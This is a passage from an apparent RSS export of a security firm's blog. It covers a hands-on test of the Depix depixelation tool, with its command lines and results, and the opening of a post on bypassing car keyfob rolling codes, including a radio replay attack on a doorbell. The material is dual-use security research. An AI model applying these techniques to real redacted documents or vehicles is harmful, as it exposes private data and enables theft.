&lt;li&gt;The search image directory includes images which are used like a dictionary to recover pixelated text. The image includes all upper- and lower-case alphanumeric letters with and without spaces for testing purposes. &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/unnamed.png&#34; alt=&#34;unnamed&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Close up, the above image looks like this - a collection of printable characters. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-30_16-00.png&#34; alt=&#34;2021 07 30 16 00&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h3&gt;3.2.1 De Bruijn sequence &lt;span class=&#34;absolute -mt-20&#34; id=&#34;321-de-bruijn-sequence&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#321-de-bruijn-sequence&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Interestingly, the above image can actually be re-created fresh on your own local machine. You don’t have to do this, as a sequence is already provided for you. However, it is interesting to see how it is produced.&lt;/p&gt;
&lt;p&gt;In the ether of the internet, there is this orphaned &lt;a href=&#34;https://gist.github.com/rgov/891712#file-debruijn-py-L16&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;script&lt;/a&gt; that will produce the sequence of printable characters necessary to also use &lt;strong&gt;Depix.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/unnamed-1.png&#34; alt=&#34;unnamed 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-27_14-56.png&#34; alt=&#34;2021 07 27 14 56&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;3.3 Test recovery&lt;span class=&#34;absolute -mt-20&#34; id=&#34;33-test-recovery&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#33-test-recovery&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;To recover redacted text there are specific methods, depending on the tools that obfuscated the original text. This is a &lt;strong&gt;significant limitation&lt;/strong&gt; that the original author recognises, however we’ll put that aside for now and come back to it later. &lt;/p&gt;
&lt;p&gt;If &lt;strong&gt;Notepad&lt;/strong&gt; is used and pixelated with &lt;strong&gt;Greenshot&lt;/strong&gt; we need the following command: &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python3&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;depix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;images&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimage3_pixels&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;images&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;searchimages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;debruinseq_notepad_Windows10_closeAndSpaced&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;o&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;images&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The command specifies the Path to the Pixelated Image (-p), Path to the Search Image (-s) and Path to Output (-o). &lt;/p&gt;
&lt;p&gt;If &lt;strong&gt;sublime&lt;/strong&gt; text editor is used and pixelated with &lt;strong&gt;Gimp&lt;/strong&gt;, this command is used: &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python3&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;depix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;images&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sublime_screenshot_pixels_gimp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;images&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;searchimages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;debruin_sublime_Linux_small&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;backgroundcolor&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;41&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;35&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;averagetype&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;linear&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The &lt;em&gt;backgroundcolour&lt;/em&gt; option filters out the coloured background of the editor and specifies the linear &lt;em&gt;averagetype&lt;/em&gt; as that’s the default averaging within Gimp. &lt;/p&gt;
&lt;h3&gt;3.3.1 Example&lt;span class=&#34;absolute -mt-20&#34; id=&#34;331-example&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#331-example&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This &lt;strong&gt;example&lt;/strong&gt; leverages the first instance of Notepad &amp;amp; Greenshot. &lt;/p&gt;
&lt;p&gt;In the image below, we see that depix begins brute forcing the images for a match.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Remember, it isn’t actually attacking the &lt;strong&gt;pixelated image&lt;/strong&gt;. Rather, it leverages the De Bruijn image (with all the printable characters) to generate combinations of letters that can be pixelated to match the &lt;strong&gt;obfuscated image.&lt;/strong&gt; &lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;images/pngbase646a8a043faedc72c4.png&#34; alt=&#34;pngbase646a8a043faedc72c4&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Depending on the size of the redacted image this can take a while. We used the author’s original, example image. As this was the ‘ideal’ condition to operate under, the brute force took around 60-90 seconds to complete! &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/pngbase64195247c857a273c2.png&#34; alt=&#34;pngbase64195247c857a273c2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;3.4 Results&lt;/strong&gt; &lt;span class=&#34;absolute -mt-20&#34; id=&#34;34-results&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#34-results&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This was the censored file we tested against - not a very pretty sight, but very redacted nonetheless. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/unnamed-2.png&#34; alt=&#34;unnamed 2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This obfuscated image was fed into &lt;strong&gt;Depix.&lt;/strong&gt; These are the results from the brute force.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/unnamed-1-1.png&#34; alt=&#34;unnamed 1 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Although the results aren’t perfect. We are still able to interpret the results. For reference, the original message said, “&lt;em&gt;Hello from the other side.”&lt;/em&gt; &lt;/p&gt;
&lt;p&gt;Not bad. &lt;em&gt;It’s pretty good&lt;/em&gt;&lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/unnamed-2-1.png&#34; alt=&#34;unnamed 2 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;We&amp;rsquo;re 10 layers deep in meme culture with this one&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h1&gt;&lt;strong&gt;4. Re-creating the test&lt;/strong&gt; &lt;/h1&gt;&lt;p&gt;In our example we were operating under &lt;strong&gt;ideal conditions.&lt;/strong&gt; As we know, in the real world, nefarious activities hardly ever take place under ideal conditions!&lt;/p&gt;
&lt;p&gt;Let’s &lt;strong&gt;recreate the experiment&lt;/strong&gt;. This time, it will be original content, not the author’s supplied example: &lt;strong&gt;we’ll create our own text, obfuscate it, and try to brute force it.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;4.1 Setup part two&lt;span class=&#34;absolute -mt-20&#34; id=&#34;41-setup-part-two&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#41-setup-part-two&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We opened &lt;strong&gt;Notepad&lt;/strong&gt; on our Windows machine. We added the shameless plug text we wanted to redact:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/pasted-image-0.png&#34; alt=&#34;pasted image 0&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;In order to &lt;strong&gt;pixelate&lt;/strong&gt; this text, I used Depix’s example obfuscator: &lt;strong&gt;genpixed.py&lt;/strong&gt; I was able to redact the text inside the image. Greenshot would be useful if only key words were redacted but to show it’s capability I redacted the whole thing: &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;genpixed&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Capture&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PNG&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;o&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Capture1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PNG&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;with -i being the input image and -o being the output image.&lt;/p&gt;
&lt;h2&gt;4.2  A disappointing recovery&lt;span class=&#34;absolute -mt-20&#34; id=&#34;42-a-disappointing-recovery&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#42-a-disappointing-recovery&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;To then &lt;strong&gt;recover&lt;/strong&gt; this &lt;strong&gt;obfuscated&lt;/strong&gt; text, we ran this big old one-liner:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;depix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Capture1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;images&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;searchimages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;debruinseq_notepad_Windows10_closeAndSpace&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;o&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;images&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;After around &lt;strong&gt;45/50 minutes&lt;/strong&gt;, Depix finally had a returned output… unfortunately it &lt;strong&gt;failed to&lt;/strong&gt; &lt;strong&gt;recover the pixelated text.&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/unnamed-3.png&#34; alt=&#34;unnamed 3&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We wondered if this was due to the length of the text we offered Depix. So we re-created this experiment with &amp;ldquo;Hello World&amp;rdquo;. The results still did not yield success.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;images/hi-1.png&#34; alt=&#34;hi 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;images/bi.png&#34; alt=&#34;bi&#34; loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This could be due to a number of reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Minor issues in the pixel layout&lt;/li&gt;
&lt;li&gt;The character font is different&lt;/li&gt;
&lt;li&gt;A faulty De Bruijn image is leveraged for the dictionary attack&lt;/li&gt;
&lt;li&gt;Or good old human error&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Regardless, one or more of these issues frustrated Depix and it failed to depixelate our original content. &lt;strong&gt;Whereas I’m sure it has a strong potential in the future, It currently has a  limited scope of what it can return.&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;5. Reviewing Depix&lt;/h1&gt;&lt;p&gt;Depix’s python program was straightforward to use. Under the ideal demo example conditions, the results were impressive considering how pixelated the sample was beforehand. But it wasn’t perfect and failed to work for our real-life original content, though we gave some reasons why that could be the case.&lt;/p&gt;
&lt;p&gt;In addition, Depix isn’t the answer to deobfuscating all pixelated text. There are only a couple of situations where it works. If the pixelation scale or cell size was different, the results would return nothing. If the pixelation was done with a tool other than the supported ones, it simply does not work. Moreover, you’d have to arbitrarily know or guess the specific tools used and hope that the Depix tool would work at de-obfuscating them. In the author’s Github, they recognise this current limitation. &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;The Depix tool poses minimal risk to security at present, as it requires specific criteria to be met to be effective.&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;For now, however, there is a small chance that users can depixelate images, so it’s recommended to use a &lt;strong&gt;full box at full opacity&lt;/strong&gt; to redact files. &lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-27_16-25.png&#34; alt=&#34;2021 07 27 16 25&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;You can pick a less offensive colour of course&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;h1&gt;&lt;strong&gt;5. Challenge&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;If you fancy having a go at this yourself, and your GPU is beefy enough for the Herculean challenge, we’d love for you to have a go at de-obfuscating this image. If you crack the code, @ us on Twitter and we’ll &lt;strong&gt;organise for something interesting to be delivered to you&lt;/strong&gt;. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/memes.png&#34; alt=&#34;memes&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;If you do use Depix (even outside of our challenge), we would be interested to hear about your experience. &lt;strong&gt;Let us know on twitter:&lt;/strong&gt; &lt;a href=&#34;https://twitter.com/jumpseclabs?lang=en&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;@JumpsecLabs&lt;/strong&gt;&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Caleb Herbert&lt;/strong&gt; is a Red Team Researcher @ JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Car Hacking - Manual Bypass of Modern Rolling Code Implementations</title>
      <link>//localhost:1313/articles/2021/07/2021-07-22-car-hacking-manual-bypass-of-modern-rolling-code-implementations/</link>
      <pubDate>Thu, 22 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/07/2021-07-22-car-hacking-manual-bypass-of-modern-rolling-code-implementations/</guid>
      <description>
        
        
        &lt;h1&gt;Introduction&lt;/h1&gt;&lt;p&gt;I recently researched modern algorithms used by keyfobs to open cars. Since most of the blogs online talking about the topic are unfortunately quite old and in general and do not precisely describe the exact path followed in detail, nor the code used. I thought that talking about my experience could be interesting and inspiring for other researchers.&lt;/p&gt;
&lt;p&gt;I won’t go in depth on certain topics and I will assume that the reader has a general background in basic signals theory and is comfortable with terms like radio frequencies, gain, filters…&lt;/p&gt;
&lt;p&gt;All the scripts used to reproduce the attack are downloadable at the following link:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/0x5c4r3/Rolling_Code_Bypass&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Github.com: Rolling_Code_Bypass&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: This thread is the first part of a research that focuses on finding a way to automatically bypass car mechanisms implementing different algorithms. Following posts will be shared during the next few months.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DISCLAIMER&lt;/strong&gt;: All the information provided on this post is for educational purposes only. JUMPSEC is no way responsible for any misuse of the information.&lt;/p&gt;
&lt;h1&gt;Background&lt;/h1&gt;&lt;h2&gt;Algorithms&lt;span class=&#34;absolute -mt-20&#34; id=&#34;algorithms&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#algorithms&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Two are the main algorithms used to send opening signals to cars:&lt;/p&gt;
&lt;p&gt;- &lt;strong&gt;Single code&lt;/strong&gt;: The keyfob always sends the same code to the car that accepts it and opens. This is an old implementation used by cars manufactured until ~2002. This legacy implementation lacks basic security since whoever intercepts the signal is able to use it to open the car (known as a replay attack). Surprisingly, in my experience, I still found modern cars implementing such algorithms. &lt;/p&gt;
&lt;p&gt;- &lt;strong&gt;Rolling code&lt;/strong&gt;: The keyfob uses an array of codes, each of which is only usable once. This much safer implementation that protects against replay attacks and is mostly used in modern cars, the most recent version will be our main focus for this research. [2]&lt;/p&gt;
&lt;h1&gt;My Path&lt;/h1&gt;&lt;h2&gt;Tools Used&lt;span class=&#34;absolute -mt-20&#34; id=&#34;tools-used&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#tools-used&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In order to detect Radio frequencies from a computer, there’s the need to use radio peripherals capable of converting radio signals from analog to digital . In my experience, I tried to use all of the most well known ones, to then choose which is the best for transmitting, receiving and jamming (see section 3.3).&lt;/p&gt;
&lt;p&gt;My choices have been the following:&lt;/p&gt;
&lt;p&gt;- &lt;strong&gt;HackRF&lt;/strong&gt;: Best device for RFHacking so far. Wide range of frequencies handled, versatile, easy to use, quite a lot of documentation online. It’s been the most used hardware device for the entire research. [3]&lt;/p&gt;
&lt;p&gt;- &lt;strong&gt;Yard Stick One&lt;/strong&gt;: Not much documentation online, I personally did not like the way it’s implemented with the RFcat firmware loaded. I ended up using it only for jamming. [4]&lt;/p&gt;
&lt;p&gt;- &lt;strong&gt;RTL SDR&lt;/strong&gt;: Only able to receive signals. I’m not happy about this piece, it gets overheated very often until there’s the need to unplug it and wait for it to cool down. I used it initially to track signals, but once I started testing with the HackRF, there has not been the need to use it anymore.&lt;/p&gt;
&lt;h2&gt;First Test: Replay Attack&lt;span class=&#34;absolute -mt-20&#34; id=&#34;first-test-replay-attack&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#first-test-replay-attack&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;To start playing around with radio frequencies, I bought a cheap radio doorbell - made of a transmitter (an actual button to stick out of the doorstep) and a couple of receivers that ring when the doorbell is clicked, then I started playing around with that. Since doorbells are quite cheap and do not need an enhanced security, they implement a basic single code algorithm, useful for testing.&lt;/p&gt;
&lt;p&gt;With that in mind, the first step was to see the signal sent from the remote doorbell using HackRF and &lt;em&gt;gqrx&lt;/em&gt;, a tool that visualises radio frequencies. Once the frequency and other settings have been set up, I observed the output shown in Figure 1.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/1.gif&#34; alt=&#34;1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 1 - gqrx tracking the signal of the doorbell when the button is clicked.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Note that usually the real frequency can be slightly moved from the one detected, depending also on the temperature of the room. From the specs, we know that the doorbell works at 433.92 MHz.&lt;/p&gt;
&lt;p&gt;Once visualized, I tried to dump the data the doorbell is sending.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2-1024x337.png&#34; alt=&#34;2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Figure 2 - Universal Radio Hacker (urh) [6] showing the recorded signal as a waveform.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt; If carefully analyzed, we can see that the waveform is actually containing 4 equal repeated signals. Below the waveform, the software is able to convert the signal to bytes. This happens through the specified modulation (in the picture on the left, Amplitude-shift keying, aka ASK). The problem with approaching modulations is that since it can totally change the output code, we should know which type the signal is using and that is often not specified.&lt;/p&gt;
&lt;p&gt;To bypass that problem, I chose to work at Signal level, modifying the actual signal and not dealing with the output code.&lt;/p&gt;
&lt;p&gt;Once I recorded the signal, I cropped it to a single repetition and transmitted it through the HackRF, making the doorbell receiver ring and proving that the path followed was right.&lt;/p&gt;
&lt;h1&gt;Rolling Code Bypass Theory&lt;/h1&gt;&lt;p&gt;Since hacking into a doorbell was not as satisfying as I expected, I tried to raise the level of the research to Rolling codes, trying first to understand the exact process needed.&lt;/p&gt;
&lt;p&gt;The methodology I am going to describe requires both some exploitation techniques and a little bit of social engineering.&lt;/p&gt;
